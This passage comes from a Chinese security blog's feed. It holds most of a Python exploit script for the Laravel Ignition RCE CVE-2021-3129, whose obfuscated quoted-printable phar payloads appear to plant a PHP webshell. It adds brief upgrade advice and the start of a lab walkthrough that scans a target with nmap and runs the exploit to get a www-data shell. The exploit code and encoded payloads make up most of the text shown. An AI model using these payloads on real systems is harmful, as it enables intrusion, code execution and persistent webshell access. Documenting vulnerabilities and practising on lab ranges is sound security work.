=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=63=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=31=00=70=00=59=00=57=00=6D=00=68=00=69=00=51=00=32=00=64=00=72=00=57=00=44=00=46=00=43=00=55=00=46=00=55=00=78=00=55=00=6D=00=4A=00=6B=00=4D=00=6D=00=68=00=32=00=57=00=56=00=63=00=78=00=63=00=46=00=68=00=54=00=61=00=7A=00=64=00=51=00=65=00=6A=00=51=00=39=00=66=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=49=00=43=00=39=00=32=00=59=00=58=00=49=00=76=00=64=00=33=00=64=00=33=00=4C=00=32=00=68=00=30=00=62=00=57=00=77=00=76=00=63=00=32=00=68=00=6C=00=62=00=47=00=77=00=75=00=63=00=47=00=68=00=77=00=4A=00=79=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=37=00=6D=00=51=00=44=00=5A=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=6C=00=2B=00=6F=00=79=00=42=00=59=00=69=00=63=00=79=00=37=00=59=00=45=00=58=00=76=00=67=00=50=00=76=00=35=00=2B=00=4D=00=62=00=48=00=55=00=53=00=2B=00=4C=00=63=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># 指定 http 和 https 走什么代理</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">send_poc_linux</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=2B=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4B=00=78=00=75=00=41=00=32=00=51=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=4E=00=45=00=5A=00=63=00=6E=00=6D=00=50=00=7A=00=6B=00=72=00=36=00=48=00=4B=00=45=00=64=00=33=00=39=00=49=00=50=00=46=00=6E=00=6A=00=73=00=2B=00=32=00=55=00=6D=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># 指定 http 和 https 走什么代理</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">filter_log</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># 指定 http 和 https 走什么代理</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">phar_ser_linux</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> path<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"phar://"</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/storage/logs/laravel.log/test.txt"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># 指定 http 和 https 走什么代理</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">get_path</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'http'</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">'https'</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(\#\d*\ (.*)(?:\/|\\)vendor)'</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> pattern<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>漏洞探测：</li></ul><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.43.23.png" style="zoom:50%;"><ul><li>木马写入</li></ul><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.43.54.png" style="zoom:50%;"><p>木马写入情况：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.42.37.png" style="zoom:50%;"><p>getshell：</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.44.59.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.45.31.png" style="zoom:50%;"><h1 id="五、修复方法"><a href="#五、修复方法" class="headerlink" title="五、修复方法"></a>五、修复方法</h1><ul><li>建议受影响的用户将Laravel框架升级至8.4.3及以上版本。</li><li>将facade ignition组件升级至2.5.2及以上版本。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CVE-2021-3129是一个影响Laravel框架的远程代码执行漏洞。当Laravel开启Debug模式时，由于Ignition组件对<code>file_get_contents()</code>和<code>file_put_contents()</code>函数的不安全使用，攻击者可以通过构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。该漏洞影响Laravel框架版本小于8.4.3以及Ignition组件版本小于2.5.2。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> 远程代码执行 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> CVE-2021-3129 </tag>
            
            <tag> Laravel RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三层网络靶场(WHOAMI)从打点到拿下域控</title>
      <link href="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/"/>
      <url>/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/</url>
      
        <content type="html"><![CDATA[<p>靶场搭建的具体过程见本站《三层网络域渗透靶场（WHOAMII）搭建》一文。</p><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><p>目标地址：192.168.43.253</p><h2 id="1-1-nmap信息收集"><a href="#1-1-nmap信息收集" class="headerlink" title="1.1 nmap信息收集"></a>1.1 nmap信息收集</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">192.168</span>.43.253 -p- <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2014.20.13.png" alt="nmap 192.168.43.253 -sC -sV -T4" style="zoom:40%;"><p>全端口扫描：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">192.168</span>.43.253 -p- <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2014.23.49.png" alt="nmap 192.168.43.253 -p- -sC -sV -T4" style="zoom:50%;"><p>不加-p-参数时，没有扫到redis的6379端口。</p><h2 id="1-2-信息分析"><a href="#1-2-信息分析" class="headerlink" title="1.2 信息分析"></a>1.2 信息分析</h2><p>80端口：nginx web服务，但是根据返回的信息看，502 bad gateway，也没啥利用价值。</p><p>81端口：nginx-web服务，Laravel框架，可以再深入了解版本信息，尝试进行历史漏洞的利用。</p><p>22端口：-ssh，可以尝试爆破。</p><p>6379端口：-redis，可以尝试未授权访问等历史漏洞利用。</p><blockquote><p>Laravel框架：</p><p>Laravel 是一个流行的 PHP Web 应用程序框架，以其优雅、简洁的设计和强大的功能而受到开发者的青睐。它遵循模型-视图-控制器（MVC）架构模式，自2011年发布以来，已经成为 PHP 开发者的首选框架之一。</p></blockquote><p>获取Laravel版本信息：Laravel v8.29.0 (PHP v7.4.14)</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2014.50.51.png" alt="访问81端口首页获取Laravel版本信息" style="zoom:80%;"><h1 id="二、-Laravel-RCE-getshell"><a href="#二、-Laravel-RCE-getshell" class="headerlink" title="二、 Laravel RCE-getshell"></a>二、 Laravel RCE-getshell</h1><h2 id="2-1-漏洞查询"><a href="#2-1-漏洞查询" class="headerlink" title="2.1 漏洞查询"></a>2.1 漏洞查询</h2><p>google查询：Laravel v8.29.0 (PHP v7.4.14)相关漏洞</p><p>exploit-db查询：检索Laravel的历史漏洞，Laravel RCE CVE-2021-3129，<a href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a> 。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2016.07.53.png" style="zoom:50%;"><p>具体漏洞复现见本站《 Laravel RCE CVE-2021-3129》这篇文章，<a href="https://sxksec.cn/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%EF%BC%8C%E8%BF%99%E7%AF%87%E6%98%AF%E6%9C%AC%E7%AB%99%E5%85%B3%E4%BA%8E%E8%AF%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AE%8C%E6%95%B4%E5%A4%8D%E7%8E%B0%E3%80%81%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E4%B8%8B%E9%9D%A2%E6%89%80%E7%94%A8%E5%88%B0%E7%9A%84%E5%85%B7%E4%BD%93%E7%9A%84exp%E4%B9%9F%E5%9C%A8%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E3%80%82">https://sxksec.cn/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/，这篇是本站关于该漏洞的完整复现、分析和利用相关的文章，下面所用到的具体的exp也在这篇文章中。</a></p><h2 id="2-2-漏洞检测"><a href="#2-2-漏洞检测" class="headerlink" title="2.2 漏洞检测"></a>2.2 漏洞检测</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CVE-2021-3129.py <span class="token parameter variable">-u</span> http://192.168.43.253:81/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.13.14.png" style="zoom:50%;"><p>成功检测到CVE-2021-3129漏洞。</p><h2 id="2-3-漏洞利用"><a href="#2-3-漏洞利用" class="headerlink" title="2.3 漏洞利用"></a>2.3 漏洞利用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CVE-2021-3129.py <span class="token parameter variable">-u</span> http://192.168.43.253:81/ <span class="token parameter variable">-e</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.14.18.png" style="zoom:50%;"><p>成功写入webshell。</p><h2 id="2-4-getshell"><a href="#2-4-getshell" class="headerlink" title="2.4 getshell"></a>2.4 getshell</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.15.52.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.20.47.png" style="zoom:50%;"><p>拿到一个www-data用户权限的shell。</p><h2 id="2-5-判断shell所处的环境"><a href="#2-5-判断shell所处的环境" class="headerlink" title="2.5 判断shell所处的环境"></a>2.5 判断shell所处的环境</h2><p>如何判断我们获取的shell是否是容器？</p><ul><li>1）系统信息：Linux 8e172820ac78 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64</li></ul><p>判断大概是一个容器<code>8e172820ac78</code>。</p><ul><li>2）hostname的输出也表现为一个容器ID。</li></ul><img 